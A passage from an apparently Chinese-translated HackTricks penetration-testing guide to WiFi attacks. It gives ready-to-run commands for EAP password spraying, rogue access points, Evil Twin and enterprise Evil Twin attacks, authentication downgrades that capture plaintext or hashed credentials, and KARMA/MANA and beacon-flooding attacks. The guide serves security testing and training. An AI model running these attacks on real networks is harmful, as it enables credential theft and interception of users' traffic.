<li><strong>EAP-TTLS (隧道传输层安全)</strong>:</li>
</ol>
<ul>
<li>通过加密隧道提供相互认证，并提供一种方法来推导动态的、每用户、每会话的 WEP 密钥。只需要服务器端证书，客户端使用凭据。</li>
</ul>
<ol start="5">
<li><strong>PEAP (受保护的可扩展认证协议)</strong>:</li>
</ol>
<ul>
<li>通过创建 TLS 隧道进行受保护的通信，功能类似于 EAP。由于隧道提供的保护，它允许在 EAP 之上使用较弱的认证协议。</li>
<li><strong>PEAP-MSCHAPv2</strong>: 通常称为 PEAP，它将脆弱的 MSCHAPv2 挑战/响应机制与保护性的 TLS 隧道结合在一起。</li>
<li><strong>PEAP-EAP-TLS (或 PEAP-TLS)</strong>: 类似于 EAP-TLS，但在交换证书之前启动 TLS 隧道，提供额外的安全层。</li>
</ul>
<p>您可以在 <a href="https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol">这里</a> 和 <a href="https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html">这里</a> 找到有关这些认证方法的更多信息。</p>
<h3 id="用户名捕获"><a class="header" href="#用户名捕获">用户名捕获</a></h3>
<p>阅读 <a href="https://tools.ietf.org/html/rfc3748#page-27">https://tools.ietf.org/html/rfc3748#page-27</a>，看起来如果您使用 <strong>EAP</strong>，<strong>“身份”</strong> <strong>消息</strong>必须被<strong>支持</strong>，并且<strong>用户名</strong>将在**“响应身份”<strong>消息中以</strong>明文**发送。</p>
<p>即使使用最安全的认证方法之一：<strong>PEAP-EAP-TLS</strong>，也可能<strong>捕获在 EAP 协议中发送的用户名</strong>。为此，<strong>捕获认证通信</strong>（在一个频道内启动 <code>airodump-ng</code>，并在同一接口中启动 <code>wireshark</code>）并通过 <code>eapol</code> 过滤数据包。<br />
在“<strong>响应，身份</strong>”数据包中，客户端的<strong>用户名</strong>将出现。</p>
<p><img src="../../.gitbook/assets/image%20(850).png" alt="" /></p>
<h3 id="匿名身份"><a class="header" href="#匿名身份">匿名身份</a></h3>
<p>身份隐藏由 EAP-PEAP 和 EAP-TTLS 支持。在 WiFi 网络的上下文中，EAP-身份请求通常由接入点（AP）在关联过程中发起。为了确保用户匿名性的保护，用户设备上的 EAP 客户端的响应仅包含初始 RADIUS 服务器处理请求所需的基本信息。这个概念通过以下场景进行说明：</p>
<ul>
<li>EAP-身份 = 匿名</li>
<li>在这种情况下，所有用户都使用伪名“匿名”作为他们的用户标识符。初始 RADIUS 服务器作为 EAP-PEAP 或 EAP-TTLS 服务器，负责管理 PEAP 或 TTLS 协议的服务器端。内部（受保护）认证方法可以在本地处理或委托给远程（家庭）RADIUS 服务器。</li>
<li>EAP-身份 = 匿名@realm_x</li>
<li>在这种情况下，来自不同领域的用户隐藏他们的身份，同时指示他们各自的领域。这允许初始 RADIUS 服务器将 EAP-PEAP 或 EAP-TTLS 请求代理到其家庭领域中的 RADIUS 服务器，这些服务器充当 PEAP 或 TTLS 服务器。初始 RADIUS 服务器仅作为 RADIUS 中继节点运行。</li>
<li>另外，初始 RADIUS 服务器可以作为 EAP-PEAP 或 EAP-TTLS 服务器，处理受保护的认证方法或将其转发到另一服务器。此选项便于为不同领域配置不同的策略。</li>
</ul>
<p>在 EAP-PEAP 中，一旦在 PEAP 服务器和 PEAP 客户端之间建立了 TLS 隧道，PEAP 服务器会发起 EAP-身份请求并通过 TLS 隧道发送。客户端通过发送包含用户真实身份的 EAP-身份响应来响应第二个 EAP-身份请求。此方法有效防止任何窃听 802.11 流量的人揭示用户的实际身份。</p>
<p>EAP-TTLS 的程序略有不同。在 EAP-TTLS 中，客户端通常使用 PAP 或 CHAP 进行身份验证，受 TLS 隧道保护。在这种情况下，客户端在隧道建立后发送的初始 TLS 消息中包含一个用户名称属性和一个密码或 CHAP 密码属性。</p>
<p>无论选择哪种协议，PEAP/TTLS 服务器在建立 TLS 隧道后都能了解用户的真实身份。真实身份可以表示为 user@realm 或简单的 user。如果 PEAP/TTLS 服务器还负责对用户进行身份验证，它现在拥有用户的身份，并继续使用 TLS 隧道保护的认证方法。或者，PEAP/TTLS 服务器可以将新的 RADIUS 请求转发到用户的家庭 RADIUS 服务器。此新的 RADIUS 请求省略了 PEAP 或 TTLS 协议层。在受保护的认证方法为 EAP 的情况下，内部 EAP 消息在没有 EAP-PEAP 或 EAP-TTLS 包装的情况下传输到家庭 RADIUS 服务器。发出的 RADIUS 消息的用户名称属性包含用户的真实身份，替换来自传入 RADIUS 请求的匿名用户名称。当受保护的认证方法为 PAP 或 CHAP（仅由 TTLS 支持）时，从 TLS 有效负载中提取的用户名称和其他认证属性在发出的 RADIUS 消息中替换，取代传入 RADIUS 请求中的匿名用户名称和 TTLS EAP 消息属性。</p>
<p>有关更多信息，请查看 <a href="https://www.interlinknetworks.com/app_notes/eap-peap.htm">https://www.interlinknetworks.com/app_notes/eap-peap.htm</a></p>
<h3 id="eap-暴力破解密码喷洒"><a class="header" href="#eap-暴力破解密码喷洒">EAP-暴力破解（密码喷洒）</a></h3>
<p>如果客户端预计使用 <strong>用户名和密码</strong>（请注意，在这种情况下 <strong>EAP-TLS 将无效</strong>），那么您可以尝试获取 <strong>用户名</strong>（见下一部分）和 <strong>密码</strong> 的 <strong>列表</strong>，并尝试使用 <a href="https://github.com/Wh1t3Rh1n0/air-hammer"><strong>air-hammer</strong></a><strong>进行</strong>暴力破解**访问。</p>
<pre><code class="language-bash">./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
</code></pre>
<p>您还可以使用 <code>eaphammer</code> 进行此攻击：</p>
<pre><code class="language-bash">./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
</code></pre>
<h2 id="客户端攻击理论"><a class="header" href="#客户端攻击理论">客户端攻击理论</a></h2>
<h3 id="网络选择与漫游"><a class="header" href="#网络选择与漫游">网络选择与漫游</a></h3>
<ul>
<li>802.11 协议定义了一个站点如何加入扩展服务集 (ESS)，但并未指定选择 ESS 或其中接入点 (AP) 的标准。</li>
<li>站点可以在共享相同 ESSID 的 AP 之间漫游，保持在建筑物或区域内的连接。</li>
<li>协议要求站点对 ESS 进行身份验证，但不要求 AP 对站点进行身份验证。</li>
</ul>
<h3 id="首选网络列表-pnl"><a class="header" href="#首选网络列表-pnl">首选网络列表 (PNL)</a></h3>
<ul>
<li>站点将每个连接的无线网络的 ESSID 存储在其首选网络列表 (PNL) 中，以及网络特定的配置细节。</li>
<li>PNL 用于自动连接已知网络，通过简化连接过程来改善用户体验。</li>
</ul>
<h3 id="被动扫描"><a class="header" href="#被动扫描">被动扫描</a></h3>
<ul>
<li>AP 定期广播信标帧，宣布其存在和特性，包括 AP 的 ESSID，除非广播被禁用。</li>
<li>在被动扫描期间，站点监听信标帧。如果信标的 ESSID 与站点的 PNL 中的条目匹配，站点可能会自动连接到该 AP。</li>
<li>了解设备的 PNL 可能导致通过模仿已知网络的 ESSID 进行潜在利用，诱使设备连接到恶意 AP。</li>
</ul>
<h3 id="主动探测"><a class="header" href="#主动探测">主动探测</a></h3>
<ul>
<li>主动探测涉及站点发送探测请求以发现附近的 AP 及其特性。</li>
<li>定向探测请求针对特定的 ESSID，帮助检测特定网络是否在范围内，即使它是一个隐藏网络。</li>
<li>广播探测请求的 SSID 字段为空，并发送到所有附近的 AP，让站点检查任何首选网络，而不透露其 PNL 内容。</li>
</ul>
<h2 id="简单的-ap-并重定向到互联网"><a class="header" href="#简单的-ap-并重定向到互联网">简单的 AP 并重定向到互联网</a></h2>
<p>在解释如何执行更复杂的攻击之前，将解释 <strong>如何</strong> 仅仅 <strong>创建</strong> 一个 <strong>AP</strong> 并 <strong>重定向</strong> 其 <strong>流量</strong> 到连接 <strong>到</strong> <strong>互联网</strong> 的接口。</p>
<p>使用 <code>ifconfig -a</code> 检查用于创建 AP 的 wlan 接口和连接到互联网的接口是否存在。</p>
<h3 id="dhcp--dns"><a class="header" href="#dhcp--dns">DHCP &amp; DNS</a></h3>
<pre><code class="language-bash">apt-get install dnsmasq #Manages DHCP and DNS
</code></pre>
<p>创建配置文件 <code>/etc/dnsmasq.conf</code>：</p>
<pre><code class="language-ini">interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
</code></pre>
<p>然后<strong>设置 IP</strong>和<strong>路由</strong>：</p>
<pre><code class="language-bash">ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
</code></pre>
<p>然后<strong>启动</strong> dnsmasq：</p>
<pre><code class="language-bash">dnsmasq -C dnsmasq.conf -d
</code></pre>
<h3 id="hostapd"><a class="header" href="#hostapd">hostapd</a></h3>
<pre><code class="language-bash">apt-get install hostapd
</code></pre>
<p>创建配置文件 <code>hostapd.conf</code>：</p>
<pre><code class="language-ini">interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
</code></pre>
<p><strong>停止烦人的进程</strong>，设置<strong>监控模式</strong>，并<strong>启动hostapd</strong>：</p>
<pre><code class="language-bash">airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
</code></pre>
<h3 id="转发和重定向"><a class="header" href="#转发和重定向">转发和重定向</a></h3>
<pre><code class="language-bash">iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</code></pre>
<h2 id="evil-twin"><a class="header" href="#evil-twin">Evil Twin</a></h2>
<p>恶意双胞胎攻击利用WiFi客户端识别网络的方式，主要依赖网络名称（ESSID），而不需要基站（接入点）向客户端进行身份验证。关键点包括：</p>
<ul>
<li><strong>区分困难</strong>：当设备共享相同的ESSID和加密类型时，难以区分合法和恶意接入点。现实世界中的网络通常使用多个具有相同ESSID的接入点以无缝扩展覆盖范围。</li>
<li><strong>客户端漫游和连接操控</strong>：802.11协议允许设备在同一ESS内的接入点之间漫游。攻击者可以利用这一点，诱使设备断开与当前基站的连接并连接到恶意接入点。这可以通过提供更强的信号或通过去身份验证数据包或干扰等方法中断与合法接入点的连接来实现。</li>
<li><strong>执行挑战</strong>：在具有多个、位置良好的接入点的环境中成功执行恶意双胞胎攻击可能具有挑战性。去身份验证单个合法接入点通常会导致设备连接到另一个合法接入点，除非攻击者能够去身份验证所有附近的接入点或战略性地放置恶意接入点。</li>
</ul>
<p>您可以通过以下方式创建一个非常基本的开放恶意双胞胎（没有将流量路由到互联网的能力）：</p>
<pre><code class="language-bash">airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
</code></pre>
<p>您还可以使用 <strong>eaphammer</strong> 创建一个 Evil Twin（请注意，要使用 eaphammer 创建恶意双胞胎，接口 <strong>不应</strong> 处于 <strong>监控</strong> 模式）：</p>
<pre><code class="language-bash">./eaphammer -i wlan0 --essid exampleCorp --captive-portal
</code></pre>
<p>或使用 Airgeddon：<code>选项：5,6,7,8,9（在 Evil Twin 攻击菜单中）。</code></p>
<p><img src="../../.gitbook/assets/image%20(1088).png" alt="" /></p>
<p>请注意，默认情况下，如果 PNL 中的 ESSID 被保存为 WPA 保护，设备将不会自动连接到开放的 Evil Twin。您可以尝试对真实 AP 进行 DoS 攻击，并希望用户手动连接到您的开放 Evil Twin，或者您可以对真实 AP 进行 DoS 攻击并使用 WPA Evil Twin 捕获握手（使用此方法您将无法让受害者连接到您，因为您不知道 PSK，但您可以捕获握手并尝试破解它）。</p>
<p><em>某些操作系统和防病毒软件会警告用户连接到开放网络是危险的...</em></p>
<h3 id="wpawpa2-evil-twin"><a class="header" href="#wpawpa2-evil-twin">WPA/WPA2 Evil Twin</a></h3>
<p>您可以创建一个 <strong>使用 WPA/2 的 Evil Twin</strong>，如果设备已配置为使用 WPA/2 连接到该 SSID，它们将尝试连接。无论如何，<strong>要完成 4-way-handshake</strong>，您还需要 <strong>知道</strong> 客户端将要使用的 <strong>密码</strong>。如果您 <strong>不知道</strong>，则 <strong>连接将无法完成</strong>。</p>
<pre><code class="language-bash">./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
</code></pre>
<h3 id="企业恶意双胞胎"><a class="header" href="#企业恶意双胞胎">企业恶意双胞胎</a></h3>
<p>要理解这些攻击，我建议在简要阅读之前先阅读 <a href="./#wpa-enterprise-mgt">WPA 企业解释</a>。</p>
<p><strong>使用 hostapd-wpe</strong></p>
<p><code>hostapd-wpe</code> 需要一个 <strong>配置</strong> 文件才能工作。要 <strong>自动化</strong> 生成这些配置，您可以使用 <a href="https://github.com/WJDigby/apd_launchpad">https://github.com/WJDigby/apd_launchpad</a>（下载 <em>/etc/hostapd-wpe/</em> 中的 python 文件）</p>
<pre><code class="language-bash">./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
</code></pre>
<p>在配置文件中，您可以选择许多不同的选项，如 ssid、频道、用户文件、cret/key、dh 参数、wpa 版本和 auth...</p>
<p><a href="evil-twin-eap-tls.html"><strong>使用 hostapd-wpe 和 EAP-TLS 允许任何证书登录。</strong></a></p>
<p><strong>使用 EAPHammer</strong></p>
<pre><code class="language-bash"># Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
</code></pre>
<p>默认情况下，EAPHammer 目的在于这些认证方法（注意 GTC 是第一个尝试获取明文密码的方法，然后使用更强大的认证方法）：</p>
<pre><code>GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
</code></pre>
<p>这是避免长连接时间的默认方法。然而，您也可以指定从最弱到最强的身份验证方法：</p>
<pre><code>--negotiate weakest
</code></pre>
<p>或者你也可以使用：</p>
<ul>
<li><code>--negotiate gtc-downgrade</code> 来使用高效的 GTC 降级实现（明文密码）</li>
<li><code>--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP</code> 手动指定提供的方法（以与组织相同的顺序提供相同的认证方法，攻击将更难被检测）。</li>
<li><a href="http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/">在维基中找到更多信息</a></li>
</ul>
<p><strong>使用 Airgeddon</strong></p>
<p><code>Airgeddon</code> 可以使用之前生成的证书为 WPA/WPA2-Enterprise 网络提供 EAP 认证。假网络将把连接协议降级为 EAP-MD5，以便能够 <strong>捕获用户和密码的 MD5</strong>。之后，攻击者可以尝试破解密码。<br />
<code>Airgeddon</code> 为你提供了 <strong>持续的恶意双胞胎攻击（嘈杂）</strong> 或 <strong>仅在有人连接时创建恶意攻击（平滑）</strong> 的可能性。</p>
<p><img src="../../.gitbook/assets/image%20(936).png" alt="" /></p>
<h3 id="在恶意双胞胎攻击中调试-peap-和-eap-ttls-tls-隧道"><a class="header" href="#在恶意双胞胎攻击中调试-peap-和-eap-ttls-tls-隧道">在恶意双胞胎攻击中调试 PEAP 和 EAP-TTLS TLS 隧道</a></h3>
<p><em>此方法在 PEAP 连接中进行了测试，但由于我正在解密任意 TLS 隧道，因此这也应该适用于 EAP-TTLS</em></p>
<p>在 <em>hostapd-wpe</em> 的 <strong>配置</strong> 中 <strong>注释</strong> 包含 <em><strong>dh_file</strong></em> 的行（从 <code>dh_file=/etc/hostapd-wpe/certs/dh</code> 到 <code>#dh_file=/etc/hostapd-wpe/certs/dh</code>）<br />
这将使 <code>hostapd-wpe</code> <strong>使用 RSA 交换密钥</strong> 而不是 DH，因此你将能够 <strong>解密</strong> 流量，前提是 <strong>知道服务器的私钥</strong>。</p>
<p>现在使用 <strong><code>hostapd-wpe</code></strong> 启动 <strong>恶意双胞胎</strong>，并使用该修改过的配置像往常一样进行。还要在执行恶意双胞胎攻击的 <strong>接口</strong> 中启动 <strong><code>wireshark</code></strong>。</p>
<p>现在或稍后（当你已经捕获了一些认证意图时），你可以在 <code>Edit --&gt; Preferences --&gt; Protocols --&gt; TLS --&gt; (RSA keys list) Edit...</code> 中将私有 RSA 密钥添加到 wireshark。</p>
<p>添加一个新条目，并用以下值填写表单：<strong>IP 地址 = any</strong> -- <strong>端口 = 0</strong> -- <strong>协议 = data</strong> -- <strong>密钥文件</strong>（<strong>选择你的密钥文件</strong>，为避免问题选择一个 <strong>没有密码保护的密钥文件</strong>）。</p>
<p><img src="../../.gitbook/assets/image%20(687).png" alt="" /></p>
<p>并查看新的 <strong>"解密的 TLS" 标签</strong>：</p>
<p><img src="../../.gitbook/assets/image%20(231).png" alt="" /></p>
<h2 id="karmamanaloud-mana-和已知信标攻击"><a class="header" href="#karmamanaloud-mana-和已知信标攻击">KARMA、MANA、Loud MANA 和已知信标攻击</a></h2>
<h3 id="essid-和-mac-黑白名单"><a class="header" href="#essid-和-mac-黑白名单">ESSID 和 MAC 黑白名单</a></h3>
<p>不同类型的媒体接入控制过滤列表（MFACLs）及其对应的模式和对恶意接入点（AP）行为的影响：</p>
<ol>
<li><strong>基于 MAC 的白名单</strong>：</li>
</ol>
<ul>
<li>恶意 AP 仅对白名单中指定的设备的探测请求作出响应，对未列出的所有其他设备保持不可见。</li>
</ul>
<ol start="2">
<li><strong>基于 MAC 的黑名单</strong>：</li>
</ol>
<ul>
<li>恶意 AP 将忽略黑名单中设备的探测请求，从而使恶意 AP 对这些特定设备不可见。</li>
</ul>
<ol start="3">
<li><strong>基于 SSID 的白名单</strong>：</li>
</ol>
<ul>
<li>恶意 AP 仅对列出的特定 ESSID 的探测请求作出响应，使其对首选网络列表（PNL）中不包含这些 ESSID 的设备不可见。</li>
</ul>
<ol start="4">
<li><strong>基于 SSID 的黑名单</strong>：</li>
</ol>
<ul>
<li>恶意 AP 不会对黑名单中特定 ESSID 的探测请求作出响应，使其对寻求这些特定网络的设备不可见。</li>
</ul>
<pre><code class="language-bash"># example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
</code></pre>
<pre><code class="language-bash"># example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
</code></pre>
<h3 id="karma"><a class="header" href="#karma">KARMA</a></h3>
<p>此方法允许<strong>攻击者创建一个恶意接入点（AP），对所有探测请求做出响应</strong>，这些请求来自寻求连接网络的设备。此技术<strong>通过模仿设备正在搜索的网络来欺骗设备连接到攻击者的AP</strong>。一旦设备向这个流氓AP发送连接请求，它就会完成连接，导致设备错误地连接到攻击者的网络。</p>
<h3 id="mana"><a class="header" href="#mana">MANA</a></h3>
<p>然后，<strong>设备开始忽略未经请求的网络响应</strong>，降低了原始karma攻击的有效性。然而，一种新的方法被引入，称为<strong>MANA攻击</strong>，由Ian de Villiers和Dominic White提出。此方法涉及流氓AP<strong>通过对设备的广播探测请求做出响应，捕获设备的首选网络列表（PNL）</strong>，并使用设备之前请求的网络名称（SSID）。这种复杂的攻击通过利用设备记住和优先考虑已知网络的方式，绕过了对原始karma攻击的保护。</p>
<p>MANA攻击通过监控设备的定向和广播探测请求来操作。对于定向请求，它记录设备的MAC地址和请求的网络名称，将这些信息添加到列表中。当收到广播请求时，AP会以与设备列表中任何网络匹配的信息做出响应，诱使设备连接到流氓AP。</p>
<pre><code class="language-bash">./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
</code></pre>
<h3 id="loud-mana"><a class="header" href="#loud-mana">Loud MANA</a></h3>
<p>一个<strong>Loud MANA 攻击</strong>是一种高级策略，适用于设备不使用定向探测或其首选网络列表（PNL）对攻击者未知的情况。它的原理是<strong>同一区域内的设备很可能在其 PNL 中共享一些网络名称</strong>。该攻击不是选择性响应，而是对所有观察到的设备的组合 PNL 中找到的每个网络名称（ESSID）广播探测响应。这种广泛的方法增加了设备识别熟悉网络并尝试连接到恶意接入点（AP）的机会。</p>
<pre><code class="language-bash">./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
</code></pre>
<h3 id="known-beacon-attack"><a class="header" href="#known-beacon-attack">Known Beacon attack</a></h3>
<p>当<strong>Loud MANA attack</strong>可能不足以满足需求时，<strong>Known Beacon attack</strong>提供了另一种方法。此方法<strong>通过模拟一个响应任何网络名称的AP来暴力破解连接过程，循环遍历从字典中派生的潜在ESSID列表</strong>。这模拟了众多网络的存在，希望能与受害者的PNL中的ESSID匹配，从而促使尝试连接到伪造的AP。通过将其与<code>--loud</code>选项结合，可以增强攻击，以更具攻击性地捕获设备。</p>
<p>Eaphammer将此攻击实现为MANA攻击，其中列表中的所有ESSID都被充电（您还可以将其与<code>--loud</code>结合以创建Loud MANA + Known beacons attack）：</p>
<pre><code class="language-bash">./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
</code></pre>
<p><strong>已知信标突发攻击</strong></p>
<p><strong>已知信标突发攻击</strong>涉及<strong>快速广播文件中列出的每个 ESSID 的信标帧</strong>。这会创建一个密集的虚假网络环境，极大地提高设备连接到恶意 AP 的可能性，尤其是在与 MANA 攻击结合使用时。该技术利用速度和数量来压倒设备的网络选择机制。</p>
<pre><code class="language-bash"># transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
</code></pre>
<h2 id="wi-fi-direct"><a class="header" href="#wi-fi-direct">Wi-Fi Direct</a></h2>
<p><strong>Wi-Fi Direct</strong> 是一种协议，使设备能够直接通过 Wi-Fi 连接，而无需传统的无线接入点。此功能集成在各种物联网 (IoT) 设备中，如打印机和电视，促进设备之间的直接通信。Wi-Fi Direct 的一个显著特点是一个设备充当接入点，称为组所有者，以管理连接。</p>
<p>Wi-Fi Direct 连接的安全性通过 <strong>Wi-Fi Protected Setup (WPS)</strong> 建立，支持多种安全配对方法，包括：</p>
<ul>
<li><strong>Push-Button Configuration (PBC)</strong></li>
<li><strong>PIN 输入</strong></li>
<li><strong>近场通信 (NFC)</strong></li>
</ul>
<p>这些方法，特别是 PIN 输入，容易受到与传统 Wi-Fi 网络中 WPS 相同的漏洞影响，使其成为类似攻击向量的目标。</p>
<h3 id="evildirect-hijacking"><a class="header" href="#evildirect-hijacking">EvilDirect Hijacking</a></h3>
<p><strong>EvilDirect Hijacking</strong> 是一种特定于 Wi-Fi Direct 的攻击。它反映了 Evil Twin 攻击的概念，但针对 Wi-Fi Direct 连接。在这种情况下，攻击者冒充合法的组所有者，目的是欺骗设备连接到恶意实体。此方法可以使用 <code>airbase-ng</code> 等工具通过指定频道、ESSID 和被冒充设备的 MAC 地址来执行：</p>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee">https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee</a></li>
<li><a href="https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9">https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9</a></li>
<li><a href="https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38">https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38</a></li>
<li><a href="https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d">https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d</a></li>
<li><a href="https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf">https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf</a></li>
<li><a href="http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/">http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/</a></li>
<li><a href="https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/">https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/</a></li>
<li><a href="https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d">https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d</a></li>
<li><a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)">https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)</a></li>
<li><a href="https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/">https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/</a></li>
</ul>
<p>TODO: 查看 <a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a> (使用 Facebook 登录和在强制门户中模仿 WPA)</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>Hacking Insights</strong><br />
参与深入探讨黑客的刺激和挑战的内容</p>
<p><strong>Real-Time Hack News</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>Latest Announcements</strong><br />
及时了解最新的漏洞赏金发布和重要平台更新</p>
<p><strong>Join us on</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a> 并立即与顶级黑客合作！</p>
<p>{% hint style="success" %}
学习和实践 AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../generic-methodologies-and-resources/pentesting-wifi/evil-twin-eap-tls.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../generic-methodologies-and-resources/pentesting-wifi/evil-twin-eap-tls.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

